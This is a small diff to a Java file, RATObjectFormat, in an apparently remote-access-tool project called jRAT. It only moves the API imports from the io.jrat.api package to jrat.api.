@@ -1,11 +1,5 @@
 package io.jrat.client.extensions;
 
-import io.jrat.api.Connection;
-import io.jrat.api.PacketBuilder;
-import io.jrat.api.Queue;
-import io.jrat.api.RATObject;
-import io.jrat.api.Reader;
-import io.jrat.api.Writer;
 import io.jrat.client.Main;
 import io.jrat.client.Slave;
 import io.jrat.client.packets.outgoing.AbstractOutgoingPacket;
@@ -13,6 +7,13 @@ import io.jrat.client.packets.outgoing.AbstractOutgoingPacket;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.IOException;
+
+import jrat.api.Connection;
+import jrat.api.PacketBuilder;
+import jrat.api.Queue;
+import jrat.api.RATObject;
+import jrat.api.Reader;
+import jrat.api.Writer;
 
 public class RATObjectFormat {
 
